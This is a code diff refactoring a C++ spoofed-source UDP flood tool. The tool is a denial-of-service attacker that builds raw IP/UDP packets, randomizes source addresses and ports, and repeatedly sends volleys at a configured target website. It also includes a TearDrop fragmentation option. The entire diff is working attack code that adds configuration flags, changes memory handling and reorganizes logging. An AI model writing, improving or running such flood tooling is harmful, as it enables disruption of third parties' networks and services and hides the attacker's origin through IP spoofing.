@@ -4,15 +4,17 @@
 #include <netinet/ip.h>
 #include <netinet/udp.h>
 #include <netdb.h>
-
+#include <memory>
+#include <utility>
 #include "../Headers/Randomizer.hpp"
 #include "../Headers/Spoofed_UDP_Flood.hpp"
 
 void Spoofed_UDP_Flood::attack(const int *id) {
     int r;
     std::vector<int> sockets;
+    sockets.reserve(static_cast<unsigned long>(conf->CONNECTIONS));
     for (int x = 0; x < conf->CONNECTIONS; x++) {
-        sockets.push_back(0);
+        sockets.emplace_back(0);
     }
     std::string message{};
     char buf[8192], *pseudogram;
@@ -30,14 +32,18 @@ void Spoofed_UDP_Flood::attack(const int *id) {
 
             if((hp = gethostbyname(conf->website.c_str())) == nullptr){
                 if((ip->daddr = inet_addr(conf->website.c_str())) == -1){
-                    logger->Log("Can't resolve the host", Logger::Error);
+                    conf->logger->Log("Can't resolve the host", Logger::Error);
                     exit(EXIT_FAILURE);
                 }
             }else{
                 bcopy(hp->h_addr_list[0], &ip->daddr, static_cast<size_t>(hp->h_length));
             }
-            if((ip->saddr = inet_addr(Randomizer::randomIP().c_str())) == -1){
-                continue;
+            if(conf->RandomizeSource){
+                if((ip->saddr = inet_addr(Randomizer::randomIP().c_str())) == -1){
+                    continue;
+                }
+            }else{
+                ip->saddr = 0;
             }
 
             init_headers(ip, udp, buf);
@@ -53,7 +59,7 @@ void Spoofed_UDP_Flood::attack(const int *id) {
             psh.length = htons(sizeof(struct udphdr) + strlen(buf));
 
             int psize = sizeof(struct pseudo_header) + sizeof(struct udphdr) + strlen(buf);
-            pseudogram = static_cast<char *>(malloc(static_cast<size_t>(psize)));
+            pseudogram = (char *) ::operator new(static_cast<size_t>(psize));
 
             memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
             memcpy(pseudogram + sizeof(struct pseudo_header) , udp , sizeof(struct udphdr) + strlen(buf));
@@ -67,24 +73,26 @@ void Spoofed_UDP_Flood::attack(const int *id) {
             }else{
                 message = std::string("Socket[") + std::to_string(x) + "->"
                           + std::to_string(sockets[x]) + "] -> " + std::to_string(r);
-                logger->Log(&message, Logger::Info);
+                conf->logger->Log(&message, Logger::Info);
                 message = std::to_string(*id) + ": Voly Sent";
-                logger->Log(&message, Logger::Info);
+                conf->logger->Log(&message, Logger::Info);
             }
+
+            delete pseudogram;
         }
         message = std::to_string(*id) + ": Voly Sent";
-        logger->Log(&message, Logger::Info);
+        conf->logger->Log(&message, Logger::Info);
         pause();
     }
 }
 
-Spoofed_UDP_Flood::Spoofed_UDP_Flood(const config *conf, Logger *logger) : Spoofed_Flood(conf, logger) {
+Spoofed_UDP_Flood::Spoofed_UDP_Flood(std::shared_ptr<Config> conf) : Spoofed_Flood(std::move(conf)) {
 
 }
 
 void Spoofed_UDP_Flood::override_headers(udphdr *udp, iphdr *ip) {
     switch(conf->vector){
-        case config::TearDrop:
+        case Config::TearDrop:
             ip->frag_off |= htons(0x2000);
             break;
         default:break;
@@ -92,7 +100,7 @@ void Spoofed_UDP_Flood::override_headers(udphdr *udp, iphdr *ip) {
 }
 
 void Spoofed_UDP_Flood::init_headers(iphdr *ip, udphdr *udp, char *buf) {
-    auto s_port = Randomizer::randomPort();
+    auto s_port = conf->RandomizePort ? Randomizer::randomPort() : 0;
     // IP Struct
     ip->ihl = 5;
     ip->version = 4;
